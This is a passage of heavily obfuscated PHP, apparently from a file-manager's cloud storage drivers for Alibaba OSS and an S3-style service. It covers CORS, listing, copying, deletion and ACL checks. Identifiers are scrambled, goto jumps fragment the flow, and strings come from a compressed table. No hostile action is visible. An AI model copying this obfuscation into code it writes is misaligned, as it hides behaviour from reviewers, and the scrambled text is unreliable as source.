$dˆô∏¶É∂ò[$bø°Ôë“®Í[86]] = $A¨ç‹âçÓ†; } } goto d°√ú∆≥ËÆ; d°√ú∆≥ËÆ: if (isset($D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[1694]])) { $dˆô∏¶É∂ò[$bø°Ôë“®Í[1694]] = $D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[1694]]; } if (isset($D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[1718]])) { $dˆô∏¶É∂ò[$bø°Ôë“®Í[1718]] = $D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[1718]]; } if (isset($D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[389]])) { $bµﬂÏ´˘Øí = $D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[389]]; if ($bµﬂÏ´˘Øí == $bø°Ôë“®Í[85]) { $dˆô∏¶É∂ò[$bø°Ôë“®Í[375]] = 1; } else { if ($bµﬂÏ´˘Øí == $bø°Ôë“®Í[1719]) { $dˆô∏¶É∂ò[$bø°Ôë“®Í[375]] = 0; } else { if ($bµﬂÏ´˘Øí) { $bµﬂÏ´˘Øí = is_array($bµﬂÏ´˘Øí) ? $bµﬂÏ´˘Øí : explode($bø°Ôë“®Í[47], $bµﬂÏ´˘Øí); $dˆô∏¶É∂ò[$bø°Ôë“®Í[389]] = array($bø°Ôë“®Í[951], $bµﬂÏ´˘Øí); $dˆô∏¶É∂ò[$bø°Ôë“®Í[375]] = 0; } } } } goto CàÙ“êÈﬂ†; CàÙ“êÈﬂ†: if (isset($D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[384]])) { $eñ¯Üû®¯ë = $this->sourceInfo($D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[384]]); $dˆô∏¶É∂ò[$bø°Ôë“®Í[399]] = array($bø°Ôë“®Í[408], $eñ¯Üû®¯ë[$bø°Ôë“®Í[373]] . $D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[384]] . $bø°Ôë“®Í[409]); } if (isset($D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[1604]]) && $D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[1604]]) { $dˆô∏¶É∂ò[$bø°Ôë“®Í[28]] = array($bø°Ôë“®Í[408], $bø°Ôë“®Í[1606] . $D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[1604]] . $bø°Ôë“®Í[1606]); } return $dˆô∏¶É∂ò; goto B˜›üœﬂﬂ≥; B˜›üœﬂﬂ≥: } } goto cÃ¨Ç‚å˘‚; e∫ªÎÇÇÎ: define($_SERVER[∞„˜ƒÑºª][0], $_SERVER[∞„˜ƒÑºª][1]); $_SERVER[ÔÒÀÃÆ›—ü] = explode($_SERVER[∞„˜ƒÑºª][2], gzinflate(substr($_SERVER[∞„˜ƒÑºª][3], 10, -8))); function Model($a…Î∑ü≤ö∞ = '', $e‡É¬Ò÷ûç = '', $eò«á∂ﬁ‡˘ = '') { goto Dí»”Ï¨°¬; A•ï—≈ú¡©: return $DåØèö¡«…[$Aç Ü…≠‚Ó]; goto C©Ø§éÕèﬂ; Dí»”Ï¨°¬: $fú÷ÜÏ”ïú =& $_SERVER[ÔÒÀÃÆ›—ü]; static $DåØèö¡«… = array(); $Aç Ü…≠‚Ó = strtolower($e‡É¬Ò÷ûç . $fú÷ÜÏ”ïú[0] . $a…Î∑ü≤ö∞); goto f‚◊€ Ÿ¥È; f‚◊€ Ÿ¥È: if (isset($DåØèö¡«…[$Aç Ü…≠‚Ó])) { return $DåØèö¡«…[$Aç Ü…≠‚Ó]; } if ($a…Î∑ü≤ö∞) { $a…Î∑ü≤ö∞ = strtoupper($a…Î∑ü≤ö∞[0]) . substr($a…Î∑ü≤ö∞, 1); $Fπâ≈ë“√¬ = $a…Î∑ü≤ö∞ . $fú÷ÜÏ”ïú[1]; if (class_exists($Fπâ≈ë“√¬)) { $DåØèö¡«…[$Aç Ü…≠‚Ó] = new $Fπâ≈ë“√¬(); return $DåØèö¡«…[$Aç Ü…≠‚Ó]; } } $DåØèö¡«…[$Aç Ü…≠‚Ó] = new ModelBase($a…Î∑ü≤ö∞, $e‡É¬Ò÷ûç, $eò«á∂ﬁ‡˘); goto A•ï—≈ú¡©; C©Ø§éÕèﬂ: } goto bâå´‘ëÕ€; b“„≈¯Í÷’: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($d¿ˆÖÊ´∑õ) { parent::__construct($d¿ˆÖÊ´∑õ); $this->signatureVersion($_SERVER[∞„˜ƒÑºª][196]); } } class PathDriverOSS extends PathDriverBase { private $accessKey = ''; private $secret = ''; private $domain = ''; private $bucket = ''; private $bucketAcl = ''; private $endpoint = null; private $client = null; public function __construct($Eã∂¢Á›ßù) { parent::__construct(); include_once SDK_DIR . $_SERVER[∞„˜ƒÑºª][878]; $this->_init($Eã∂¢Á›ßù); } private function _init($EëîË”Ïéƒ) { foreach ($EëîË”Ïéƒ as $c¥∆à˜¢òä => $FÂﬁ◊îúöÚ) { if (isset($this->{$c¥∆à˜¢òä})) { $this->{$c¥∆à˜¢òä} = $FÂﬁ◊îúöÚ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[∞„˜ƒÑºª][879], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function setBucketCors() { goto DïÃû°ﬁ·ì; eÛèë¯¥’∑: $E†…ï§ÏáÏ->addAllowedOrigin($bã√ÉûÊÏü[880]); $E†…ï§ÏáÏ->addAllowedMethod($bã√ÉûÊÏü[881]); $E†…ï§ÏáÏ->addAllowedMethod($bã√ÉûÊÏü[882]); goto aÛ“˜ñ£ÜÉ; DïÃû°ﬁ·ì: $bã√ÉûÊÏü =& $_SERVER[∞„˜ƒÑºª]; $a§”‚Ê¯Ôã = new OSS\Model\CorsConfig(); $E†…ï§ÏáÏ = new OSS\Model\CorsRule(); goto eÛèë¯¥’∑; fÿ’ﬂêÑâ‰: $a§”‚Ê¯Ôã->addRule($E†…ï§ÏáÏ); try { $this->client->putBucketCors($this->bucket, $a§”‚Ê¯Ôã); } catch (OSS\Core\OssException $fåÕ¡Î€ÊØ) { return !1; } return !0; goto d£‡†π≈Èç; bµûÖ”èºº: $E†…ï§ÏáÏ->setMaxAgeSeconds(600); $E†…ï§ÏáÏ->addExposeHeader($bã√ÉûÊÏü[885]); $E†…ï§ÏáÏ->addAllowedHeader($bã√ÉûÊÏü[880]); goto fÿ’ﬂêÑâ‰; aÛ“˜ñ£ÜÉ: $E†…ï§ÏáÏ->addAllowedMethod($bã√ÉûÊÏü[883]); $E†…ï§ÏáÏ->addAllowedMethod($bã√ÉûÊÏü[884]); $E†…ï§ÏáÏ->addAllowedMethod($bã√ÉûÊÏü[151]); goto bµûÖ”èºº; d£‡†π≈Èç: } public function getBucketCors() { goto f˘êñî·ÿî; dó≤ØÕåÖå: return array($a—üπóÌ‡ﬂ[171] => isset($DË€Ò«ü–ı[0]) ? $DË€Ò«ü–ı[0] : $a—üπóÌ‡ﬂ[33], $a—üπóÌ‡ﬂ[175] => $aæ‹áäö—Ÿ, $a—üπóÌ‡ﬂ[886] => $f©‘é†·Ç‚, $a—üπóÌ‡ﬂ[887] => isset($EáªŒﬁÒ∆º[0]) ? $EáªŒﬁÒ∆º[0] : $a—üπóÌ‡ﬂ[33], $a—üπóÌ‡ﬂ[173] => isset($dµ÷›ÈÕÖì[0]) ? $dµ÷›ÈÕÖì[0] : $a—üπóÌ‡ﬂ[33]); goto BúÖﬂ•±µâ; FÂõé¶òå∞: if (!$Cí´Ñê‚Áì || !($Bƒßâë∏ò√ = $Cí´Ñê‚Áì->getRules())) { return null; } $DË€Ò«ü–ı = $Bƒßâë∏ò√[0]->getAllowedOrigins(); $aæ‹áäö—Ÿ = $Bƒßâë∏ò√[0]->getAllowedMethods(); goto Bøå˘ö‘ä·; f˘êñî·ÿî: $a—üπóÌ‡ﬂ =& $_SERVER[∞„˜ƒÑºª]; $Cí´Ñê‚Áì = null; try { $Cí´Ñê‚Áì = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $CõäÁ›˘êΩ) { return null; } goto FÂõé¶òå∞; Bøå˘ö‘ä·: $f©‘é†·Ç‚ = $Bƒßâë∏ò√[0]->getMaxAgeSeconds(); $EáªŒﬁÒ∆º = $Bƒßâë∏ò√[0]->getExposeHeaders(); $dµ÷›ÈÕÖì = $Bƒßâë∏ò√[0]->getAllowedHeaders(); goto dó≤ØÕåÖå; BúÖﬂ•±µâ: } public function isBucketCors() { goto fÚ€ŸÓîïí; F«µÓù◊«›: if ($füÈ»∞™Ü”[$aøÃãì’õ±[171]] != $aøÃãì’õ±[172] || $füÈ»∞™Ü”[$aøÃãì’õ±[173]] != $aøÃãì’õ±[172]) { return !1; } $F…∂≈Êç‡∫ = array_map($aøÃãì’õ±[174], $füÈ»∞™Ü”[$aøÃãì’õ±[175]]); if (!is_array($F…∂≈Êç‡∫)) { $F…∂≈Êç‡∫ = array(); } goto cı…–Ì≥±û; cı…–Ì≥±û: $C·äØ¨î¬È = array($aøÃãì’õ±[176], $aøÃãì’õ±[177], $aøÃãì’õ±[178], $aøÃãì’õ±[179], $aøÃãì’õ±[180]); $bºàµ–êŒß = array_diff($C·äØ¨î¬È, $F…∂≈Êç‡∫); return empty($bºàµ–êŒß); goto DÈººÍ∫Ÿ‹; fÚ€ŸÓîïí: $aøÃãì’õ± =& $_SERVER[∞„˜ƒÑºª]; $füÈ»∞™Ü” = $this->getBucketCors(); if (!$füÈ»∞™Ü” || !is_array($füÈ»∞™Ü”)) { return !1; } goto F«µÓù◊«›; DÈººÍ∫Ÿ‹: } public function mkfile($FéÀ∞ÉÖÉÛ, $D‘ö†≈ÈÛö = '', $eáëµöÙ˘± = REPEAT_RENAME) { $a¥ñõ≈âΩƒ = $this->setContent($FéÀ∞ÉÖÉÛ, $D‘ö†≈ÈÛö); if ($a¥ñõ≈âΩƒ !== !1) { return $this->getPathOuter($FéÀ∞ÉÖÉÛ); } return !1; } public function mkdir($d≤îÍÎö√ê, $eäîï£ÙÑÛ = REPEAT_SKIP) { if ($this->isFolder($d≤îÍÎö√ê)) { return $this->getPathOuter($d≤îÍÎö√ê); } try { $Dâ ∆õ£´± = $this->pathEncode($d≤îÍÎö√ê); $this->client->createObjectDir($this->bucket, $Dâ ∆õ£´±); } catch (OSS\Core\OssException $E§…“ÑÚïÖ) { return !1; } return $this->getPathOuter($d≤îÍÎö√ê); } private function fileList($C∫áíæªØÍ, $EêÃºè‰≥‡ = '', $d‘´èø±Á¥ = 0) { goto dµÀÿ®ì‡Ö; bÔâÆ§ô€: while (!0) { $f≈ŸÏéÉ‘ç = array($dûÇöÀÇ«[888] => $EêÃºè‰≥‡, $dûÇöÀÇ«[182] => $eﬁåãœ∫ÜË, $dûÇöÀÇ«[889] => $A«¿Æ™ÁñŒ, $dûÇöÀÇ«[890] => $d‰ÎÜ˘‡åÒ); try { $dÉå∑‰ƒ∞™ = $this->client->listObjects($this->bucket, $f≈ŸÏéÉ‘ç); } catch (OSS\Core\OssException $A≈πÓö”ó´) { break; } $d‰ÎÜ˘‡åÒ = $dÉå∑‰ƒ∞™->getNextMarker(); $e◊›áá≥©« = $dÉå∑‰ƒ∞™->getObjectList(); $F”ñÓ∏ˆ™» = $dÉå∑‰ƒ∞™->getPrefixList(); foreach ($e◊›áá≥©« as $f¶â®àîπÏ) { if ($f¶â®àîπÏ->getKey() == $eﬁåãœ∫ÜË) { continue; } $bø≤âÉ¶â° = $f¶â®àîπÏ->getKey(); if ($d‘´èø±Á¥) { $bø≤âÉ¶â° = array($dûÇöÀÇ«[28] => $bø≤âÉ¶â°, $dûÇöÀÇ«[86] => $f¶â®àîπÏ->getSize(), $dûÇöÀÇ«[186] => strtotime($f¶â®àîπÏ->getLastModified())); } $C‘∫ıû“≥Ë[] = $bø≤âÉ¶â°; } foreach ($F”ñÓ∏ˆ™» as $E≠ã÷ˆä™§) { $E«àÜá®±ì[] = $E≠ã÷ˆä™§->getPrefix(); } if ($d‰ÎÜ˘‡åÒ === $dûÇöÀÇ«[33]) { break; } } return array($dûÇöÀÇ«[83] => $E«àÜá®±ì, $dûÇöÀÇ«[82] => $C‘∫ıû“≥Ë); goto e‚∑ÿÍ®©û; dµÀÿ®ì‡Ö: $dûÇöÀÇ« =& $_SERVER[∞„˜ƒÑºª]; $C∫áíæªØÍ = trim($C∫áíæªØÍ, $dûÇöÀÇ«[8]); $eﬁåãœ∫ÜË = empty($C∫áíæªØÍ) ? $dûÇöÀÇ«[33] : $C∫áíæªØÍ . $dûÇöÀÇ«[8]; goto aêæ≥€ıÑ¶; aêæ≥€ıÑ¶: $d‰ÎÜ˘‡åÒ = $dûÇöÀÇ«[33]; $A«¿Æ™ÁñŒ = 1000; $E«àÜá®±ì = $C‘∫ıû“≥Ë = array(); goto bÔâÆ§ô€; e‚∑ÿÍ®©û: } public function copyFile($E´¡ÍíÕ≥Á, $c˘à‹•öú¢) { $e¶äéπ“ Á = $this->size($E´¡ÍíÕ≥Á); if ($e¶äéπ“ Á < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $this->pathEncode($E´¡ÍíÕ≥Á), $this->bucket, $this->pathEncode($c˘à‹•öú¢)); } catch (OSS\Core\OssException $bﬁ‘∫∑‚··) { return !1; } return !0; } return $this->multiCopyObject($E´¡ÍíÕ≥Á, $c˘à‹•öú¢, $e¶äéπ“ Á); } private function multiCopyObject($dá√ÁÌËÁ‡, $cŒÖ—˜ºö’, $eìî±•¬ùó) { $e˜íˆ”èÈ≠ =& $_SERVER[∞„˜ƒÑºª]; try { goto aà∞„ïâœÓ; dåπººãıè: $C„öŸî†æé = 1; $BÑ¨§¿§ü∂ = 0; $e¬ü¢‘®ßÁ = array(); goto a∏¿ÆÊ°£∂; aà∞„ïâœÓ: $A≥¡¿Ö©Â¡ = array(); if ($E„·¶ìïºÔ = $this->hashMd5($dá√ÁÌËÁ‡)) { $A≥¡¿Ö©Â¡ = array(OSS\OssClient::OSS_HEADERS => array($e˜íˆ”èÈ≠[891] => $E„·¶ìïºÔ)); } $bëïè‘·Íº = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($cŒÖ—˜ºö’), $A≥¡¿Ö©Â¡); goto dåπººãıè; a∏¿ÆÊ°£∂: $E∆îçŸ∫ã— = $this->client->generateMultiuploadParts($eìî±•¬ùó, 1024 * 1024 * 10); foreach ($E∆îçŸ∫ã— as $E‘ç™ëÔÇ± => $aÆ´èóíø™) { $cáÍíº€∆Ω = $BÑ¨§¿§ü∂ + (int) $aÆ´èóíø™[$e˜íˆ”èÈ≠[892]]; $a€≥Œ¬∏Õ„ = (int) $aÆ´èóíø™[$e˜íˆ”èÈ≠[324]] + $cáÍíº€∆Ω - 1; $bπëè†‚∂¶ = array($e˜íˆ”èÈ≠[893] => $cáÍíº€∆Ω, $e˜íˆ”èÈ≠[894] => $a€≥Œ¬∏Õ„); $e¬ü¢‘®ßÁ[] = $this->client->uploadPartCopy($this->bucket, $this->pathEncode($dá√ÁÌËÁ‡), $this->bucket, $this->pathEncode($cŒÖ—˜ºö’), $C„öŸî†æé, $bëïè‘·Íº, $bπëè†‚∂¶); $C„öŸî†æé = $C„öŸî†æé + 1; } $Bè∫äÒëê√ = array(); goto e√∏‡◊≥ãé; e√∏‡◊≥ãé: foreach ($e¬ü¢‘®ßÁ as $E‘ç™ëÔÇ± => $E≠úŒ™Ë⁄‰) { $Bè∫äÒëê√[] = array($e˜íˆ”èÈ≠[895] => $E‘ç™ëÔÇ± + 1, $e˜íˆ”èÈ≠[896] => $E≠úŒ™Ë⁄‰); } $fºã±∑á≈ = $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($cŒÖ—˜ºö’), $bëïè‘·Íº, $Bè∫äÒëê√); goto eªÏ∂£πåÒ; eªÏ∂£πåÒ: } catch (OSS\Core\OssException $EÖ÷ÃÔµÉÚ) { return !1; } return !0; } public function moveFile($cûÜ∂πê“ï, $D«ÿﬂòÕ€Ñ) { if ($this->copyFile($cûÜ∂πê“ï, $D«ÿﬂòÕ€Ñ)) { $this->remove($cûÜ∂πê“ï); return !0; } return !1; } public function delFile($aô°ÿÜâ…ç) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($aô°ÿÜâ…ç)); } catch (OSS\Core\OssException $DÔÜÕ≈⁄Ω∆) { return !1; } return !0; } public function delFolder($dÚÛµ˜™ÛÈ) { $fàñˆÎÌ™’ =& $_SERVER[∞„˜ƒÑºª]; $eË«Ñœ’â = $this->fileList($dÚÛµ˜™ÛÈ); if (!empty($dÚÛµ˜™ÛÈ) && !in_array(trim($dÚÛµ˜™ÛÈ, $fàñˆÎÌ™’[8]) . $fàñˆÎÌ™’[8], $eË«Ñœ’â[$fàñˆÎÌ™’[82]])) { $eË«Ñœ’â[$fàñˆÎÌ™’[82]][] = trim($dÚÛµ˜™ÛÈ, $fàñˆÎÌ™’[8]) . $fàñˆÎÌ™’[8]; } foreach (array_chunk($eË«Ñœ’â[$fàñˆÎÌ™’[82]], 1000) as $d≤»é·ÇºÖ) { try { $this->client->deleteObjects($this->bucket, $d≤»é·ÇºÖ); } catch (OSS\Core\OssException $AÚèïÓ∫åÌ) { return !1; } } return !0; } public function rename($F∆øòÕ›á÷, $F’î¯ÕÂ‘Ñ) { return $this->renameObject($F∆øòÕ›á÷, $F’î¯ÕÂ‘Ñ); } public function size($aÉòÀ€¨Íˆ) { if (!$this->isFile($aÉòÀ€¨Íˆ)) { return 0; } try { $fŒ¿»∫êÀÚ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($aÉòÀ€¨Íˆ)); } catch (OSS\Core\OssException $e∏ª≈œœ¨) { return !1; } return $fŒ¿»∫êÀÚ[$_SERVER[∞„˜ƒÑºª][897]] + 0; } public function info($BÆëªúœøá) { if ($this->isFolder($BÆëªúœøá)) { return $this->folderInfo($BÆëªúœøá, 1); } if (!$this->isFile($BÆëªúœøá)) { return !1; } return $this->fileInfo($BÆëªúœøá); } private function fileInfo($cËÏé‡ÜÓé, $e⁄‹• Ô–Æ = array(), $d‡”ù«¬Ïé = false) { goto d≥ﬂÉÌÏƒ ; Dóã¬˜¢Ì•: if (isset($e⁄‹• Ô–Æ[$BΩŸÑÇâÔÉ[183]])) { $EùìåòÏÏñ[$BΩŸÑÇâÔÉ[183]] = $e⁄‹• Ô–Æ[$BΩŸÑÇâÔÉ[183]]; } return $EùìåòÏÏñ; goto D®€ººÏ∆¨; EÃÜá»ßãû: if (empty($e⁄‹• Ô–Æ)) { $DàﬂÁÕ§•ö = $this->client->getObjectMeta($this->bucket, $this->pathEncode($cËÏé‡ÜÓé)); if (!$DàﬂÁÕ§•ö) { return $EùìåòÏÏñ; } $e⁄‹• Ô–Æ = array($BΩŸÑÇâÔÉ[183] => $DàﬂÁÕ§•ö[$BΩŸÑÇâÔÉ[898]][$BΩŸÑÇâÔÉ[899]], $BΩŸÑÇâÔÉ[186] => strtotime($DàﬂÁÕ§•ö[$BΩŸÑÇâÔÉ[900]]), $BΩŸÑÇâÔÉ[86] => $DàﬂÁÕ§•ö[$BΩŸÑÇâÔÉ[897]] + 0); $this->fileInfoImage($cËÏé‡ÜÓé, $EùìåòÏÏñ); } $EùìåòÏÏñ[$BΩŸÑÇâÔÉ[109]] = $e⁄‹• Ô–Æ[$BΩŸÑÇâÔÉ[186]]; $EùìåòÏÏñ[$BΩŸÑÇâÔÉ[86]] = $e⁄‹• Ô–Æ[$BΩŸÑÇâÔÉ[86]]; goto Dóã¬˜¢Ì•; d≥ﬂÉÌÏƒ : $BΩŸÑÇâÔÉ =& $_SERVER[∞„˜ƒÑºª]; if ($d‡”ù«¬Ïé) { return array($BΩŸÑÇâÔÉ[28] => $this->pathThis($cËÏé‡ÜÓé), $BΩŸÑÇâÔÉ[84] => $this->getPathOuter($cËÏé‡ÜÓé), $BΩŸÑÇâÔÉ[29] => $BΩŸÑÇâÔÉ[163], $BΩŸÑÇâÔÉ[156] => $this->ext($cËÏé‡ÜÓé), $BΩŸÑÇâÔÉ[86] => isset($e⁄‹• Ô–Æ[$BΩŸÑÇâÔÉ[86]]) ? $e⁄‹• Ô–Æ[$BΩŸÑÇâÔÉ[86]] : 0); } $EùìåòÏÏñ = array($BΩŸÑÇâÔÉ[28] => $this->pathThis($cËÏé‡ÜÓé), $BΩŸÑÇâÔÉ[84] => $this->getPathOuter($cËÏé‡ÜÓé), $BΩŸÑÇâÔÉ[29] => $BΩŸÑÇâÔÉ[163], $BΩŸÑÇâÔÉ[183] => $BΩŸÑÇâÔÉ[50], $BΩŸÑÇâÔÉ[109] => $BΩŸÑÇâÔÉ[50], $BΩŸÑÇâÔÉ[86] => 0, $BΩŸÑÇâÔÉ[156] => $this->ext($cËÏé‡ÜÓé), $BΩŸÑÇâÔÉ[184] => !0, $BΩŸÑÇâÔÉ[185] => !0); goto EÃÜá»ßãû; D®€ººÏ∆¨: } private function folderInfo($fäÊ¿ØÎÿ√, $e‚Õ„Œ⁄‰ä = 0, $cèí‹ÆèÌı = false) { $eÓ∏û¬∂ìÆ =& $_SERVER[∞„˜ƒÑºª]; if ($cèí‹ÆèÌı) { return array($eÓ∏û¬∂ìÆ[28] => $this->pathThis($fäÊ¿ØÎÿ√), $eÓ∏û¬∂ìÆ[84] => $this->getPathOuter($eÓ∏û¬∂ìÆ[8] . $fäÊ¿ØÎÿ√), $eÓ∏û¬∂ìÆ[29] => $eÓ∏û¬∂ìÆ[85]); } $eÇ¶≥ï‰¯‰ = array($eÓ∏û¬∂ìÆ[28] => $this->pathThis($fäÊ¿ØÎÿ√), $eÓ∏û¬∂ìÆ[84] => $this->getPathOuter($eÓ∏û¬∂ìÆ[8] . $fäÊ¿ØÎÿ√), $eÓ∏û¬∂ìÆ[29] => $eÓ∏û¬∂ìÆ[85], $eÓ∏û¬∂ìÆ[183] => $eÓ∏û¬∂ìÆ[50], $eÓ∏û¬∂ìÆ[109] => $eÓ∏û¬∂ìÆ[50], $eÓ∏û¬∂ìÆ[187] => !1, $eÓ∏û¬∂ìÆ[188] => !1, $eÓ∏û¬∂ìÆ[184] => !0, $eÓ∏û¬∂ìÆ[185] => !0); if ($e‚Õ„Œ⁄‰ä) { $eÇ¶≥ï‰¯‰[$eÓ∏û¬∂ìÆ[187]] = $this->has($fäÊ¿ØÎÿ√, !1); $eÇ¶≥ï‰¯‰[$eÓ∏û¬∂ìÆ[188]] = $this->has($fäÊ¿ØÎÿ√, !0); } return $eÇ¶≥ï‰¯‰; } public function exist($Dƒë‹ﬁß›“) { if ($this->isFile($Dƒë‹ﬁß›“) || $this->isFolder($Dƒë‹ﬁß›“)) { return !0; } return !1; } public function isFile($B±òŸı∞ïÑ) { if ($this->isFolder($B±òŸı∞ïÑ)) { return !1; } try { return $this->client->doesObjectExist($this->bucket, $this->pathEncode($B±òŸı∞ïÑ)); } catch (OSS\Core\OssException $e∏∂∑êá¢´) { return !1; } } public function isFolder($B≥êçä’™«) { $fæ•ñíÃı∂ =& $_SERVER[∞„˜ƒÑºª]; try { $B≥êçä’™« = trim($B≥êçä’™«, $fæ•ñíÃı∂[8]); $A“Î–ËœÑÀ = array($fæ•ñíÃı∂[888] => $fæ•ñíÃı∂[8], $fæ•ñíÃı∂[182] => empty($B≥êçä’™«) ? $fæ•ñíÃı∂[33] : $B≥êçä’™« . $fæ•ñíÃı∂[8], $fæ•ñíÃı∂[889] => 1, $fæ•ñíÃı∂[890] => $fæ•ñíÃı∂[33]); $a§èãÛ∆Ÿ˜ = $this->client->listObjects($this->bucket, $A“Î–ËœÑÀ); } catch (OSS\Core\OssException $d∫›ÒÃ’äÚ) { return !1; } $CÁÆÜ∂ùõª = $a§èãÛ∆Ÿ˜->getObjectList(); $b∞Ω©¥€ıö = $a§èãÛ∆Ÿ˜->getPrefixList(); return empty($CÁÆÜ∂ùõª) && empty($b∞Ω©¥€ıö) ? !1 : !0; } public function listPath($A‰µŸŒ∞Êƒ, $aÆ∑“ÇŒÉò = false, $b’ÜÖ”ÎÜ∑ = false) { $EÖÏ–ÜÒÃß =& $_SERVER[∞„˜ƒÑºª]; $Eäª‡ÂΩù° = $this->fileList($A‰µŸŒ∞Êƒ, $EÖÏ–ÜÒÃß[8], 1); foreach ($Eäª‡ÂΩù°[$EÖÏ–ÜÒÃß[83]] as $DÔÔ≠ªÌè∂ => $c∂¿‡ƒ˘ôç) { $Eäª‡ÂΩù°[$EÖÏ–ÜÒÃß[83]][$DÔÔ≠ªÌè∂] = $this->folderInfo($c∂¿‡ƒ˘ôç, $aÆ∑“ÇŒÉò, $b’ÜÖ”ÎÜ∑); } foreach ($Eäª‡ÂΩù°[$EÖÏ–ÜÒÃß[82]] as $DÔÔ≠ªÌè∂ => $Eˆ«ƒ‡º·í) { $Eäª‡ÂΩù°[$EÖÏ–ÜÒÃß[82]][$DÔÔ≠ªÌè∂] = $this->fileInfo($Eˆ«ƒ‡º·í[$EÖÏ–ÜÒÃß[28]], $Eˆ«ƒ‡º·í, $b’ÜÖ”ÎÜ∑); } return $Eäª‡ÂΩù°; } public function has($AÈ¶Æ‡ñ´ı, $eÇ…çﬁ≤Êˆ = true) { goto Eü≥ø≤¢Öå; Eü≥ø≤¢Öå: $eÁΩ±À•˜Â =& $_SERVER[∞„˜ƒÑºª]; $AÈ¶Æ‡ñ´ı = trim($AÈ¶Æ‡ñ´ı, $eÁΩ±À•˜Â[8]); $CËãÖºîﬂ® = empty($AÈ¶Æ‡ñ´ı) ? $eÁΩ±À•˜Â[33] : $AÈ¶Æ‡ñ´ı . $eÁΩ±À•˜Â[8]; goto BŸãÖÎ§¢à; BŸãÖÎ§¢à: $B‹ƒ£Ù›Í≠ = $eÁΩ±À•˜Â[33]; $c«ıâÉ£ÔÇ = 100; while (!0) { $Dè≠À∑ª¬Ì = array($eÁΩ±À•˜Â[888] => $eÁΩ±À•˜Â[8], $eÁΩ±À•˜Â[182] => $CËãÖºîﬂ®, $eÁΩ±À•˜Â[889] => $c«ıâÉ£ÔÇ, $eÁΩ±À•˜Â[890] => $B‹ƒ£Ù›Í≠); try { $B•å„„≤´∫ = $this->client->listObjects($this->bucket, $Dè≠À∑ª¬Ì); } catch (OSS\Core\OssException $F’∂Ø±Ìß∏) { break; } $B‹ƒ£Ù›Í≠ = $B•å„„≤´∫->getNextMarker(); $c≤ÁÌ≤ô∞… = $B•å„„≤´∫->getObjectList(); $BëÊ›ﬂä˘ä = $B•å„„≤´∫->getPrefixList(); if ($eÇ…çﬁ≤Êˆ) { if (!empty($c≤ÁÌ≤ô∞…)) { if (count($c≤ÁÌ≤ô∞…) > 1 || $c≤ÁÌ≤ô∞…[0]->getKey() != $CËãÖºîﬂ®) { return !0; } } } else { if (!empty($BëÊ›ﬂä˘ä)) { return !0; } } if ($B‹ƒ£Ù›Í≠ === $eÁΩ±À•˜Â[33]) { break; } } goto c›˜‡“âÆÈ; c›˜‡“âÆÈ: return !1; goto aÆ¶’ìßì∂; aÆ¶’ìßì∂: } public function listAll($B®ƒîêÎØâ) { $a·Éãì≥´ =& $_SERVER[∞„˜ƒÑºª]; $bößä§êß® = $this->fileList($B®ƒîêÎØâ, $a·Éãì≥´[33], 1); $cÈËµÓç’œ = array(); foreach ($bößä§êß®[$a·Éãì≥´[82]] as $C„á†ëÃ‘„) { $cÈËµÓç’œ[$C„á†ëÃ‘„[$a·Éãì≥´[28]]] = $C„á†ëÃ‘„[$a·Éãì≥´[86]]; } return $this->listAllFiles($B®ƒîêÎØâ, array_keys($cÈËµÓç’œ), $cÈËµÓç’œ); } public function canRead($e™£¶öˆö±) { $CÚıó∞…Ü∆ =& $_SERVER[∞„˜ƒÑºª]; $D∞ÉÏ∆±Ïë = $this->pathAcl($e™£¶öˆö±); return $D∞ÉÏ∆±Ïë == $CÚıó∞…Ü∆[901] || $D∞ÉÏ∆±Ïë == $CÚıó∞…Ü∆[902] ? !0 : !1; } public function canWrite($eéÁ—Ü¬åç) { $a≠⁄éñ¢õ∂ = $this->pathAcl($eéÁ—Ü¬åç); return $a≠⁄éñ¢õ∂ == $_SERVER[∞„˜ƒÑºª][902] ? !0 : !1; } public function pathAcl($B†õê£◊•˘) { goto CâÌﬁç»≤≤; dà˘ÁŒé„ﬁ: return $Dƒåìò˜áÜ; goto D·£á∏≈òˆ; cºôº‡ÿÓã: $Dƒåìò˜áÜ = $F´æâ™©‘˜ == $Bßé…àèƒÊ[34] ? $this->bucketAcl : $F´æâ™©‘˜; if ($Dƒåìò˜áÜ == $Bßé…àèƒÊ[903]) { return $Bßé…àèƒÊ[901]; } if ($Dƒåìò˜áÜ == $Bßé…àèƒÊ[904]) { return $Bßé…àèƒÊ[902]; } goto dà˘ÁŒé„ﬁ; CâÌﬁç»≤≤: $Bßé…àèƒÊ =& $_SERVER[∞„˜ƒÑºª]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $F´æâ™©‘˜ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($B†õê£◊•˘)); } catch (OSS\Core\OssException $cì£óûñ®Á) { return !1; } goto cºôº‡ÿÓã; D·£á∏≈òˆ: } private function chmodPath($B‘‘¬Ìà“ª, $bâË„£ªîÏ = '') { $d”ßõÖµ»¢ =& $_SERVER[∞„˜ƒÑºª]; $d•≈ÌêÜ‘ë = empty($bâË„£ªîÏ) ? $d”ßõÖµ»¢[904] : $bâË„£ªîÏ; $a ä´¯•¶’ = array($d”ßõÖµ»¢[34], $d”ßõÖµ»¢[181], $d”ßõÖµ»¢[903], $d”ßõÖµ»¢[904]); if (!in_array($d•≈ÌêÜ‘ë, $a ä´¯•¶’)) { return !1; } try { 